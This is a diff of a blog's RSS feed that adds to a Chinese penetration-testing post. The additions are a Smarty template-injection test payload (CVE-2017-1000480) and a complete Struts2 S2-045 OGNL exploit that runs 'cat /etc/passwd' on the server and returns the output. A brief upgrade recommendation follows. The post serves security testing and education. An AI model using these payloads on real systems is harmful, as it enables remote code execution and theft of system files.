@@ -6,8 +6,8 @@
 </description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 09 Apr 2018 11:21:52 +0800</pubDate>
-    <lastBuildDate>Mon, 09 Apr 2018 11:21:52 +0800</lastBuildDate>
+    <pubDate>Mon, 16 Apr 2018 14:33:16 +0800</pubDate>
+    <lastBuildDate>Mon, 16 Apr 2018 14:33:16 +0800</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
     
       <item>
@@ -173,8 +173,39 @@ SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to 
 
 &lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;
 
-&lt;h3 id=&quot;1php中常见场景&quot;&gt;1）PHP中常见场景&lt;/h3&gt;
+&lt;h3 id=&quot;php中常见场景---模板引擎代码执行&quot;&gt;PHP中常见场景 - 模板引擎代码执行&lt;/h3&gt;
 
+&lt;p&gt;Smarty简介&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Smarty是一个PHP的模板引擎。更明确来说，它可以帮助开发者更好地 分离程序逻辑和页面显示。最好的例子，是当程序员和模板设计师是不同的两个角色的情况，而且 大部分时候都不是同一个人的情况。&lt;/p&gt;
+
+  &lt;p&gt;CVE-ID : CVE-2017-1000480&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行&lt;/p&gt;
+
+&lt;p&gt;测试Payload：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*/phpinfo();/*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-16/0x00.png&quot; alt=&quot;0x00&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;java-struts2-s2-045&quot;&gt;Java Struts2 （S2-045）&lt;/h3&gt;
+
+&lt;p&gt;由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行&lt;/p&gt;
+
+&lt;p&gt;测试Payload：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-16/0x01.png&quot; alt=&quot;0x01&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;
+
+&lt;p&gt;升级插件、框架新版本&lt;/p&gt;
 </description>
         <pubDate>Thu, 22 Mar 2018 00:00:00 +0800</pubDate>
         <link>http://localhost:4000/archivers/2018-03-22/1</link>
